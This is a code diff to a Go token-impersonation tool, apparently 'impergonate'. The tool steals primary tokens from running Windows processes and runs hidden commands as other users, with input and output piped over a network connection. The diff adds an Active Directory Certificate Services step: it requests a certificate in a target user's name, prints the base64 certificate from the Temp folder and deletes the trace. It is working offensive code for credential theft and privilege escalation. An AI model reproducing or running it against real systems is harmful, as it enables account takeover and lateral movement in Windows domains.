@@ -7,6 +7,8 @@ import (
 	"os/exec"
 	"syscall"
 	"time"
+	"bufio"
+	"bytes"
 	"github.com/fourcorelabs/wintoken"
 	ps "github.com/mitchellh/go-ps"
 	"github.com/Serizao/impergonate/communication"
@@ -49,11 +51,32 @@ func main() {
 			os.Exit(1)
 		} else {
 			if *generateCertificate && *caConfig!="" {
-				rawCmd:=adcs.InfFile(*caConfig)
+				rawCmd:=adcs.InfFile(*caConfig,*username)
 				command:=adcs.FinalCommand(rawCmd)
-				useToken(*domain, *username, command, *shell)
+				useToken(*domain, *username, command, *shell, false)
+				FileB64Cert, err := os.Open( os.Getenv("windir")+"\\Temp\\cert-auth"+(*username)+".b64")
+
+			    if err != nil {
+			    	fmt.Print("[-] Unable to obtain Cert")
+			    } else {
+			    	
+			    	fmt.Print("[+] cert b64 :\n\n")
+			    	scanner := bufio.NewScanner(FileB64Cert)
+					for scanner.Scan() {
+						a :=bytes.Replace([]byte(scanner.Text()), []byte("\x00"), []byte(""), -1)
+						a =bytes.Replace(a, []byte("\xff"), []byte(""), -1)
+						a =bytes.Replace(a, []byte("\xfe"), []byte(""), -1)
+				        fmt.Println(string(a))
+				    }
+				    FileB64Cert.Close()
+			    	e := os.Remove( os.Getenv("windir")+"\\Temp\\cert-auth"+(*username)+".b64")
+				    if e != nil {
+				        fmt.Print("[-] Unable to delete temp file :",e)
+				    }
+			    }
+			    os.Exit(0)
 			} else if *username != "" && *domain != "" {
-				useToken(*domain, *username, *command, *shell)
+				useToken(*domain, *username, *command, *shell,true)
 				os.Exit(0)
 			}	
 		} 
@@ -88,7 +111,7 @@ func listToken() {
 }
 
 
-func useToken(domain string, username string, cmdline string, shell bool) {
+func useToken(domain string, username string, cmdline string, shell bool,exit bool) {
 	processes, _ := ps.Processes()
 	for _, process := range processes {
 		token, err := wintoken.OpenProcessToken(process.Pid(), wintoken.TokenPrimary) //pass 0 for own process
@@ -105,7 +128,7 @@ func useToken(domain string, username string, cmdline string, shell bool) {
 		
 
 						conn,_ := communication.Connect()
-						cmd := exec.Command("powershell.exe", "-c", cmdline+"\n\n")
+						cmd := exec.Command("cmd.exe", "/c", cmdline+"\n\n")
 						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,Token: syscall.Token(token.Token())}
 						cmd.Stdin = conn
 						cmd.Stdout = conn
@@ -122,7 +145,11 @@ func useToken(domain string, username string, cmdline string, shell bool) {
 					if err := cmd.Run(); err != nil {
 						fmt.Println("Error: ", err)
 					} else {
-						os.Exit(0)
+						if exit {
+							os.Exit(0)
+						} else {
+							return
+						}
 					}
 				}
 			}
